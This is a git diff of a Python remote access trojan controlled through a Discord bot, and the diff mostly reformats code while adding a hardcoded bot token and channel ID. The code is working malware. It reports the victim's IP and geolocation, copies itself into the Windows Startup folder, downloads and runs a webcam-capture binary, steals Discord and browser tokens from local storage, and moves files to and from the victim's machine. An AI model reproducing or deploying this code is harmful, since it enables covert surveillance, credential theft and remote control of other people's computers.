@@ -4,8 +4,12 @@ from requests import get
 from socket import create_connection
 
 # All the needed variables
-notification_channel = 01101110011101010110110001101100
+notification_channel = 11011100111010101101100011011
 bot_token = "nullcode.yadayada.isthebest"
+bot_prefix = "rat> "
+
+notification_channel = 846008857745686549
+bot_token = "ODM4NjI1MTY0OTQ1Nzg0ODQy.YI90jA.KkkStDWROoCtXjQaz1xoE-x_yYgs"
 bot_prefix = "rat> "
 
 client = commands.Bot(command_prefix=bot_prefix)
@@ -14,25 +18,18 @@ ogdir = os.getcwd(); a = 1
 
 # Required functions
 def IP():
-    try:
-        addr = get("https://api.ipify.org/").text
-    except:
-        addr = "127.0.0.1"
+    try: addr = get("https://api.ipify.org/").text
+    except: addr = "127.0.0.1"
     return addr
 
 def is_connected():
-    try:
-        create_connection(("1.1.1.1", 53))
-        return True
-    except OSError:
-        pass
+    try: create_connection(("1.1.1.1", 53)); return True
+    except OSError: pass
     return False
 
 def EmbedGen(title_main, color, name, value):
-    if color == "def":
-        color = 0x0081FA
-    if not color == "def":
-        color2 = color
+    if color == "def": color = 0x0081FA
+    if not color == "def": color2 = color
     embed = discord.Embed(title=title_main, color=color)
     embed.add_field(name=name, value=value)
     embed.set_footer(text="Written by NullCode#0187")
@@ -47,9 +44,7 @@ async def on_ready():
 @client.command()  # Sends IP
 async def getip(ctx):
     await ctx.send(
-        embed=discord.Embed(
-            title=f"The IP of {os.getenv('username')} is: {IP()}", color=0x0081FA
-        )
+        embed=discord.Embed(title=f"The IP of {os.getenv('username')} is: {IP()}", color=0x0081FA)
     )
 
 @client.command()  # Get environment variables
@@ -61,18 +56,14 @@ async def getenv(ctx, env):
 @client.command()  # Gets current working directory
 async def cwd(ctx):
     await ctx.send(
-        embed=EmbedGen(
-            "Current directory", "def", "The present directory is: ", os.getcwd()
-        )
+        embed=EmbedGen("Current directory", "def", "The present directory is: ", os.getcwd())
     )
 
 @client.command()  # Shuts down bot
 async def exit(ctx, ip):
     if ip == IP():
         await ctx.send(
-            embed=EmbedGen(
-                "Information", 0xFF0505, "Given IP is " + IP(), "Exiting Bot"
-            )
+            embed=EmbedGen("Information", 0xFF0505, "Given IP is " + IP(), "Exiting Bot")
         )
         await client.logout()
 
@@ -97,8 +88,7 @@ async def geolocate(ctx):
 @client.command()
 async def startup(ctx):
     from sys import executable; msg = "```\n"
-    await ctx.send(embed = discord.Embed(title = "Last known RAT directory: \n" + ogdir, color = 0x0081FA))
-    await ctx.send(embed = discord.Embed(title = "Current Directory: \n" + os.getcwd(), color = 0x0081FA))
+    await ctx.send(embed = discord.Embed(title = "Last known RAT directory: \n" + ogdir + "Current Directory: \n" + os.getcwd(), color = 0x0081FA))
     os.chdir(ogdir)
     await ctx.send(embed = discord.Embed(title = "Trying to copy payload into startup directory...", color = 0x0081FA))
     subprocess.run(f'copy "{executable}" "{os.getenv("appdata")}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
@@ -109,23 +99,18 @@ async def startup(ctx):
     
 @client.command()  # Idea was Sp00p's, but this is a brand new implementation by me
 async def webcam(ctx):
-    import base64
+    from base64 import decodebytes
     webcam = bytes(get("https://raw.githubusercontent.com/NullCode13-Misc/CommandCam/master/CommandCam_binary_base64").text, "utf-8")
-    os.chdir(os.getenv("temp"))
-    with open("cc.exe", "wb") as fh:
-        fh.write(base64.decodebytes(webcam))
+    os.chdir(f"C:\\Users\\{os.getenv('username')}\\Saved Games")
+    with open("cc.exe", "wb") as fh: fh.write(decodebytes(webcam))
     subprocess.run("cc.exe & ren image.bmp image.png", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-    await ctx.send(
-        embed=discord.Embed(title="Here is the photo", color=0x0081FA),
-        file=discord.File(os.path.join(os.getenv("temp") + "\\image.png")),
-    )
+    await ctx.send(embed=discord.Embed(title="Here is the photo", color=0x0081FA), file=discord.File(os.path.join(os.getenv("temp") + "\\image.png")))
     os.remove(os.path.join(os.getenv("temp") + "\\image.png"))
     os.remove(os.path.join(os.getenv("temp") + "\\cc.exe")); os.chdir(ogdir)
 
 @client.command()
 async def token(ctx):
-    local = os.getenv("LOCALAPPDATA")
-    roaming = os.getenv("APPDATA")
+    local = os.getenv("LOCALAPPDATA"); roaming = os.getenv("APPDATA")
     paths = {
         "Discord": roaming + "\\Discord",                                  "Discord Canary": roaming + "\\discordcanary",
         "Discord PTB": roaming + "\\discordptb",                           "Lightcord": roaming + "\\Lightcord",
@@ -145,58 +130,44 @@ async def token(ctx):
                         for token in re.findall(regex, line): 
                             tokens.append(token); tokens2.append(platform)
         except FileNotFoundError: continue
-    for tks, tks2 in zip(tokens, tokens2): message += f"{tks2}: `{tks}`\n"
-    await ctx.send(message)
+    for tks, tks2 in zip(tokens, tokens2): message += f"__**{tks2}**__: `{tks}`\n"
+    await ctx.send(message.rstrip())
     
 # Download and upload
 @client.command()
-async def upload(ctx, name, isBig="zzz"):
-    if isBig == "zzz":
+async def upload(ctx, name, isBig="null"):
+    if isBig == "null":
         attachment = ctx.message.attachments[0]
         url = attachment.url
         r = get(url, allow_redirects=True)
         open(name, "wb").write(r.content)
-        await ctx.send(
-            embed=EmbedGen(
-                "DL information", "def", "Sending over file to victim: ", "Success"
-            )
-        )
+        await ctx.send(embed=EmbedGen("DL information", "def", "Sending over file to victim: ", "Success"))
     else:
         url = isBig
         r = get(url, allow_redirects=True)
         open(name, "wb").write(r.content)
-        await ctx.send(
-            embed=EmbedGen(
-                "DL information", "def", "Sending over file to victim: ", "Success"
-            )
-        )
+        await ctx.send(embed=EmbedGen("DL information", "def", "Sending over file to victim: ", "Success"))
 
 @client.command()
 async def download(ctx, filepath):
     # upload makes use of `` [code indicators]: Example - "`C:\Users\NullCode\a.txt`"
-    filepath = filepath[:-1]
-    filepath = filepath[1:]
+    filepath = filepath[:-1]; filepath = filepath[1:]
     await ctx.send("Uploading file...")
     await ctx.send(file=discord.File(filepath))
 
 # Change directory
 @client.command()
 async def cd(ctx, dire):
-    dire = dire[:-1]
-    dire = dire[1:]  # cd makes use of `` [code indicators]: Example - "`C:\Users\NullCode`"
+    dire = dire[:-1]; dire = dire[1:]  # cd makes use of `` [code indicators]: Example - "`C:\Users\NullCode`"
     os.chdir(dire)
-    await ctx.send(
-        embed=EmbedGen(
-            "CD information", "def", "Changing directory to " + os.getcwd(), "Success"
-        )
-    )
+    await ctx.send(embed=EmbedGen("CD information", "def", "Changing directory to " + os.getcwd(), "Success"))
 
 # View directory
 @client.command()
 async def dir(ctx, dire="null"):
     if dire == "null":
         dire = os.getcwd()
-        subprocess.run('dir > "%temp%\\dir.txt"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+        subprocess.run('dir > "C:\\Users\\{}\\Saved Games\\dir.txt"'.format(os.getenv("username")), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
     else:
         dire = dire[:-1]; dire = dire[1:] # dir makes use of `` [code indicators]: Example - "`C:\Users\NullCode`"
 
@@ -220,11 +191,7 @@ async def gsl(ctx):
         stdin=subprocess.PIPE,
     )
     await ctx.send(
-        "Here is the file",
-        file=discord.File(
-            os.path.join(os.getenv("TEMP") + "\\youtube.txt"),
-            filename="General Output.txt",
-        ),
+        "Here is the file", file=discord.File(os.path.join(os.getenv("TEMP") + "\\youtube.txt"), filename="General Output.txt"),
     )
     os.remove(os.path.join(os.getenv("TEMP") + "\\youtube.txt"))
 
